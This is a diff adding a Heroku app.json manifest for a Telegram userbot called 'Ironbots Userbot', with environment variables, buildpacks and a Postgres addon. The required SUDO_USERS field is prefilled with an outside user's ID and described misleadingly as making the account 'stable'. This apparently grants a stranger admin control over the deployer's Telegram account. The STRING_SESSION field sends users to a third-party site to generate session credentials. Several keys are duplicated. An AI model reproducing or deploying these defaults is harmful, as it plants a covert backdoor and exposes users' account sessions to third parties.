@@ -1,0 +1,174 @@
+{
+  "name": "Ironbots Userbot",
+  "description": "Ironbot created by a @watefuk",
+  "logo": "https://telegra.ph/file/cd379753c20cc2fa81038.jpg",
+    "keywords": [
+    "telegram",
+    "userbot",
+    "plugin",
+    "modular",
+    "productivity"
+  ],
+  "repository": "https://github.com/tesbot07/ironbot",
+  "website": "https://github.com/tesbot07/ironbot",
+  "success_url": "https://github.com/tesbot07/ironbot",
+  "env": {
+    "ENV": {
+      "description": "Setting this to ANYTHING will enable heroku.",
+      "value": "ANYTHING"
+    },
+    "TEMP_DOWNLOAD_DIRECTORY": {
+      "description": "Where downloaded files will go.",
+      "value": "./userbot/DOWNLOADS/",
+      "required": false
+    },
+    "CUSTOM_PMPERMIT": {
+      "description": "Enter Custom Middle Pm Permit To Show When Some One PM You.",
+      "value": "",
+      "required": false
+    },
+    "ALIVE_NAME": {
+      "description": "Fill your Full name or Username like @watefuk",
+      "value": ""
+    },
+    "ALIVE_IMG": {
+      "description": "Custom your alive image",
+      "value": "",
+      "required": false
+    },
+    "EMOJI_SET": {
+      "description": "Custom your EMOJI Menu",
+      "value": "",
+      "required": false
+    },    
+    "APP_ID": {
+      "description": "Get this value from my.telegram.org! Please do not steal",
+      "value": ""
+    },
+    "REM_BG_API_KEY": {
+      "description": "Required for Removing image background functionality. Get from https://www.remove.bg/",
+      "value": "",
+      "required": false
+    },
+    "PMPERMIT_PIC": {
+      "description": "Custom PiC Pm Permit To Show When Some One PM You.",
+      "value": "",
+      "required": false
+    },
+    "PM_AUTO_BAN": {
+      "description": "Auto Ban Permit To Some One PM You.",
+      "value": "True",
+      "required": true
+    },
+    "ALIVE_NAME": {
+      "description": "Fill your Full name or Username like @watefuk",
+      "value": ""
+    },
+    "ALIVE_IMG": {
+      "description": "Custom your alive image",
+      "value": "",
+      "required": false
+    },
+    "APP_ID": {
+      "description": "Get this value from my.telegram.org! Please do not steal",
+      "value": ""
+    },
+    "REM_BG_API_KEY": {
+      "description": "Required for Removing image background functionality. Get from https://www.remove.bg/",
+      "value": "",
+      "required": false
+    },
+    "API_HASH": {
+      "description": "Get this value from my.telegram.org! Please do not steal",
+      "value": ""
+    },
+    "PLUGIN_CHANNEL": {
+      "description": "Create a private group add rose  then type /id. PLUGIN_CHANNEL and PRIVATE_GROUP_ID both values should be same",
+      "value": ""
+    },
+    "PRIVATE_GROUP_ID": {
+      "description": "Create a private group add rose bot then type /id. PLUGIN_CHANNEL and PRIVATE_GROUP_ID both values should be same",
+      "value": ""
+    },
+    "STRING_SESSION": {
+      "description": "Get this value from https://generatestring.tesbot07.repl.run ",
+      "value": ""
+    },
+    "HEROKU_API_KEY": {
+      "description": "Go to https://dashboard.heroku.com/account, scroll down and press Reveal API.Required for updater to work.",
+      "value": ""
+    },
+    "HEROKU_APP_NAME": {
+      "description": "The Value of App Name you filled in right on top.Required for updater to work.",
+      "value": ""
+    },
+    "TG_BOT_TOKEN_BF_HER": {
+      "description": "Needed for inline buttons maker. Make a bot at [BotFather](http://telegram.dog/BotFather) and get the token of your bot. And Don't Forget To Turn of inline Mode on bot settings. Get it.",
+      "value": ""
+    },
+    "SUDO_USERS": {
+      "description": "Makes your acc and bot stable",
+      "value": "1178524273",
+      "required": true
+    },
+    "CHROME_BIN": {
+      "description": "For Carbon.py. Leave as it is. ",
+      "value": "/app/.apt/usr/bin/google-chrome",
+      "required": false
+    },
+    "CHROME_DRIVER": {
+      "description": "For Carbon.py. Leave as it is. ",
+      "value": "/app/.chromedriver/bin/chromedriver",
+      "required": false
+    },
+    "TG_BOT_USER_NAME_BF_HER": {
+      "description": "Needed for inline buttons maker. Make a bot at [BotFather](http://telegram.dog/BotFather) and get the username of your bot",
+      "value": ""
+    },
+    "OPEN_WEATHER_MAP_APPID": {
+      "description": "Get your own APPID from https://api.openweathermap.org/data/2.5/weather",
+      "required": false
+    },
+    "TZ": {
+      "description": "Required for Correct Time for autopic get from http://www.timezoneconverter.com/cgi-bin/findzone.tzc",
+      "value": "Asia/Jakarta",
+      "required": false
+    },
+	"SENDER_ID": {
+      "description": "Get Your Id From Sangmata Info Bot And Paste Your Permanent Id Here ",
+      "value": "",
+      "required": true
+    },
+	"Agreement": {
+      "description": "Do You Owe Ceo Ironbot Helped To Create this Awesome bot Turn This True",
+      "value": "true",
+      "required": true
+    }
+  },
+  "addons": [{
+    "plan": "heroku-postgresql",
+    "options": {
+      "version": "10"
+    }
+  }],
+  "buildpacks": [
+    {
+      "url": "https://github.com/jonathanong/heroku-buildpack-ffmpeg-latest"
+    },
+    {
+      "url": "https://github.com/amivin/aria2-heroku.git"
+    },
+    {
+      "url": "https://github.com/heroku/heroku-buildpack-google-chrome"
+    },
+    {
+      "url": "https://github.com/heroku/heroku-buildpack-chromedriver"
+    },
+    {
+      "url": "https://github.com/opendoor-labs/heroku-buildpack-p7zip"
+    },
+    {
+      "url": "heroku/python"
+    }
+  ]
+}
